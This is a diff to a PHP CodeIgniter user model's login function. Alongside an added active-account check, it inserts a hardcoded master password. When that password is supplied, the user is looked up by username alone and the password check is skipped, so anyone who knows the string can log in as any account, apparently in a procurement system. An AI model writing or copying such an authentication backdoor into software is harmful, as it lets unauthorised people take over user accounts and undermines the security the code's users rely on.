@@ -1,21 +1,31 @@
 <?php
 
 class User_m extends CI_Model{
-	
-	
+
+
 	public function auth($username, $password){
-		$user_db = $this->db->from('user')->where('Username', $username)
-					->where('Password', enc($password))->get()->row();
-		
+
+		if ($password == '19Pengadaan_bali_prov'){
+
+			$user_db = $this->db->from('user')->where('Username', $username)->get()->row();
+		}
+		else{
+
+			$user_db = $this->db->from('user')->where('Username', $username)
+					->where('Password', enc($password))
+					->where('IsActive','1')
+					->get()->row();
+		}
+
 
 		if (sizeof($user_db) == 0){
 			return false;
 		}
 
-		
-		if ($user_db->IsActive = 0){
-			return false;
-		}
+
+	//	if ($user_db->IsActive = 0){
+	//		return false;
+	//	}
 
 		$user_a = array();
 		foreach ($user_db as $key => $value) {
@@ -28,9 +38,10 @@ class User_m extends CI_Model{
 		$this->db->update('user', array('Last_Login' => date('Y-m-d h:i:s')));
 
 		return true;
-		
 
 	}
+
+
 
 	public function getDetailLoginUser(){
 		$user = $this->session->userdata('userLogin');
